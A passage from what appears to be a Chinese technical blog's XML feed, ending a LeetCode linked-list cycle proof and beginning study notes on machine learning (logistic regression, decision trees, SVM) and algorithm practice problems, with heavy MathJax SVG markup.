-11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z"></path></g></g></g></svg></mjx-container>，并记<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex" xmlns="http://www.w3.org/2000/svg" width="8.407ex" height="1.756ex" role="img" focusable="false" viewBox="0 -694 3716 776"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path></g><g data-mml-node="mo" transform="translate(710.8, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(1766.6, 0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z"></path></g><g data-mml-node="mo" transform="translate(2286.8, 0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mi" transform="translate(3287, 0)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g></g></g></svg></mjx-container>，则二者相遇时有：</p>
<script type="math/tex; mode=display">f=a+b+nl</script><script type="math/tex; mode=display">s=a+b+ml</script><p>其中<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex" xmlns="http://www.w3.org/2000/svg" width="1.357ex" height="1.025ex" role="img" focusable="false" viewBox="0 -442 600 453"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g></g></svg></mjx-container>、<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex" xmlns="http://www.w3.org/2000/svg" width="1.986ex" height="1.025ex" role="img" focusable="false" viewBox="0 -442 878 453"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g></g></g></svg></mjx-container>为常数，表示快慢指针走过的圈数。由于快指针是慢指针2倍速度，则有：</p>
<script type="math/tex; mode=display">f=2s</script><p>带入化解消去<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex" xmlns="http://www.w3.org/2000/svg" width="0.971ex" height="1.595ex" role="img" focusable="false" viewBox="0 -694 429 705"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g></g></g></svg></mjx-container>得到：</p>
<script type="math/tex; mode=display">(n-2m-1)l=a-c</script><p>即：</p>
<script type="math/tex; mode=display">l|a-c</script><p>这样意味着慢指针从相遇点出发并经过<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex" xmlns="http://www.w3.org/2000/svg" width="11.138ex" height="1.692ex" role="img" focusable="false" viewBox="0 -666 4922.9 748"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(822.2, 0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(1822.4, 0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(2322.4, 0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(3422.7, 0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(4422.9, 0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></svg></mjx-container>圈后，与同时从起点出发的另一慢指针在环入口处相遇。</p>
]]></content>
      <categories>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>LeetCode</tag>
      </tags>
  </entry>
  <entry>
    <title>百面机器学习笔记</title>
    <url>/2020/02/27/%E7%99%BE%E9%9D%A2%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>包括机器学习和算法2部分 <a href="https://ai.deepshare.net/detail/p_5e0d9c6c8355e_qVlliKCw/6">课程地址</a></p>
<span id="more"></span>
<h1 id="Week-1"><a href="#Week-1" class="headerlink" title="Week 1"></a>Week 1</h1><h2 id="机器学习"><a href="#机器学习" class="headerlink" title="机器学习"></a>机器学习</h2><p>分类算法</p>
<ul>
<li>逻辑回归<ul>
<li>极大似然估计<ul>
<li>似然：通过样本猜测总体</li>
</ul>
</li>
<li>梯度下降法推导</li>
<li>逻辑回归推导<ul>
<li>在线性回归外层套一个sigmoid</li>
</ul>
</li>
</ul>
</li>
<li>决策树<ul>
<li>ID3 信息增益 仅离散属性</li>
<li>C4.5 信息增益比 = 信息增益/划分前熵 连续值</li>
<li>CART Gini指数（集合的不确定性） 仅二叉树</li>
<li>剪枝（防止过拟合）<ul>
<li>预剪枝</li>
<li>后剪枝（剪掉叶结点较少的分支）</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><ul>
<li>快速排序<ul>
<li>挖坑法（双指针）</li>
<li>指针交换法（交换数据）</li>
</ul>
</li>
<li>堆排序</li>
<li>双指针<ul>
<li>对撞指针</li>
<li>快慢指针</li>
<li>滑动窗口</li>
</ul>
</li>
</ul>
<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><h4 id="算法刷题重点题型"><a href="#算法刷题重点题型" class="headerlink" title="算法刷题重点题型"></a>算法刷题重点题型</h4><ul>
<li><p>[x] 双指针（167）：<a href="https://leetcode-cn.com/problems/two-sum-ii-input-array-is-sorted">https://leetcode-cn.com/problems/two-sum-ii-input-array-is-sorted</a></p>
</li>
<li><p>[ ] 快速选择、堆排序、归并排序（215）：<a href="https://leetcode-cn.com/problems/kth-largest-element-in-an-array">https://leetcode-cn.com/problems/kth-largest-element-in-an-array</a></p>
</li>
<li><p>[ ] 桶排序（347）：<a href="https://leetcode-cn.com/problems/top-k-frequent-elements">https://leetcode-cn.com/problems/top-k-frequent-elements</a></p>
</li>
<li><p>[x] 滑动窗口（209）：<a href="https://leetcode-cn.com/problems/minimum-size-subarray-sum/">https://leetcode-cn.com/problems/minimum-size-subarray-sum/</a></p>
<ul>
<li>长度最小的连续子数组</li>
</ul>
</li>
<li><p>[x] 滑动窗口（438）：<a href="https://leetcode-cn.com/problems/find-all-anagrams-in-a-string/">https://leetcode-cn.com/problems/find-all-anagrams-in-a-string/</a></p>
<ul>
<li>找到字符串中所有字母异位词</li>
</ul>
</li>
<li><p>[ ] 滑动窗口（76）：<a href="https://leetcode-cn.com/problems/minimum-window-substring/">https://leetcode-cn.com/problems/minimum-window-substring/</a></p>
<ul>
<li>最小覆盖子串</li>
</ul>
</li>
</ul>
<h4 id="算法刷题课后作业"><a href="#算法刷题课后作业" class="headerlink" title="算法刷题课后作业"></a>算法刷题课后作业</h4><ul>
<li><p>[ ] 数组中重复的数字：<a href="https://www.nowcoder.com/practice/623a5ac0ea5b4e5f95552655361ae0a8">https://www.nowcoder.com/practice/623a5ac0ea5b4e5f95552655361ae0a8</a></p>
</li>
<li><p>[ ] 构建乘积数组：<a href="https://www.nowcoder.com/practice/94a4d381a68b47b7a8bed86f2975db46">https://www.nowcoder.com/practice/94a4d381a68b47b7a8bed86f2975db46</a></p>
</li>
<li><p>[ ] 二维数组中的查找：<a href="https://www.nowcoder.com/practice/abc3fe2ce8e146608e868a70efebf62e">https://www.nowcoder.com/practice/abc3fe2ce8e146608e868a70efebf62e</a></p>
</li>
</ul>
<h1 id="Week-2"><a href="#Week-2" class="headerlink" title="Week 2"></a>Week 2</h1><h2 id="机器学习-1"><a href="#机器学习-1" class="headerlink" title="机器学习"></a>机器学习</h2><ul>
<li>SVM<ul>
<li>线性可分</li>
<li>超平面 最大间隔超平面（最近的样本点到平面的距离）</li>
<li>支持向量（距离超平面最近的点）</li>
<li>SVM的最优化问题</li>
<li>对偶问题<ul>
<li>构造拉格朗日函数</li>
<li><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="29.75ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 13149.6 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(878, 0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(1223, 0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(1823, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(2212, 0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(3090, 0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mi" transform="translate(3619, 0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(4191, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(4580, 0)"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"></path></g><g data-mml-node="mo" transform="translate(5130, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(5519, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(6185.8, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(7241.6, 0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(8119.6, 0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mi" transform="translate(8648.6, 0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(9220.6, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(9609.6, 0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(10487.6, 0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(10832.6, 0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(11432.6, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(11821.6, 0)"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"></path></g><g data-mml-node="mo" transform="translate(12371.6, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(12760.6, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 